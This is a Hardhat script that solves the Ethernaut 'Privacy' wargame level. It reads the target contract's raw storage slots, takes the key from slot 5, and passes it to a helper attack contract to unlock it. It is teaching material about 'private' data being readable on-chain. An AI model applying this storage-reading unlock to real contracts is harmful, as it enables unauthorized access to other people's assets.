/*
The creator of the Privacy contract was careful enough to protect the sensitive areas of its storage.

Unlock the Privacy contract to beat the level.

Things that might help:

Understanding how storage works
Understanding how parameter parsing works
Understanding how casting works
Tips:

Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.
*/


const hre = require("hardhat");

async function main() {
  // Deployed on Ganache
  [player] = await ethers.getSigners();

  // Get an instance of the contract deployed by Ethernaut
  const PrivacyAddress = "0x3d1F4E5e5e16F27E23157216d8374df3C7244f95"
  this.privacy = await hre.ethers.getContractAt("Privacy",PrivacyAddress);

  //Deploying the Attack Privacy contract
  const AttackPrivacy = await hre.ethers.getContractFactory("AttackPrivacy");
  this.attackPrivacy = await AttackPrivacy.connect(player).deploy(this.privacy.address);
  await this.attackPrivacy.deployed();
  

  /*
  * Slot 0 has the locked variable
  * Slot 1 has the ID variable
  * Slot 2 has the 2 uint8 vars and the uin16 var -> The 3 combined takes up the 32 bytes available in the entire second slot of the storage
  * Slot 3 has the first bytes32 of data   --> data[0]
  * Slot 4 has the second bytes32 of data  --> data[1]
  * Slot 5 has the third bytes32 of data   --> data[2]  <---> Wich in theory stored the key!
  */

  console.log(
    `
    ${await hre.ethers.provider.getStorageAt(PrivacyAddress,0)} \n
    ${await hre.ethers.provider.getStorageAt(PrivacyAddress,1)} \n
    ${await hre.ethers.provider.getStorageAt(PrivacyAddress,2)} \n
    ${await hre.ethers.provider.getStorageAt(PrivacyAddress,3)} \n
    ${await hre.ethers.provider.getStorageAt(PrivacyAddress,4)} \n
    ${await hre.ethers.provider.getStorageAt(PrivacyAddress,5)} \n
    ${await hre.ethers.provider.getStorageAt(PrivacyAddress,6)} \n
    ${await hre.ethers.provider.getStorageAt(PrivacyAddress,7)} \n
    `
  );

  // If the variable locked is true, the Privacy contract is locked!
  console.log(
    `
    Is privacy contrat locked? ${await this.privacy.locked()} \n
    `
  );

  console.log("\n\n Performing attack ... \n");

  const fullKeyGottenFromPrivacyContract = await hre.ethers.provider.getStorageAt(PrivacyAddress,5);

  // Unlocking the Privacy Contract
  console.log("Unlocking the Privacy Contract ...");

  let floor = 10;
  const tx = await this.attackPrivacy.connect(player).unlockPrivacyContrack(fullKeyGottenFromPrivacyContract);
  
  // Await for the tx to be mined
  console.log("Waiting while Privacy contract is unlocked : )");
  let txResult = await tx.wait();

  //console.log("transaction " , txResult);

  console.log("\n===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n");

  // If the variable locked is true, the Privacy contract is still locked!
  console.log(
    `
    Is privacy contrat locked? ${await this.privacy.locked()} \n
    `
  );

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});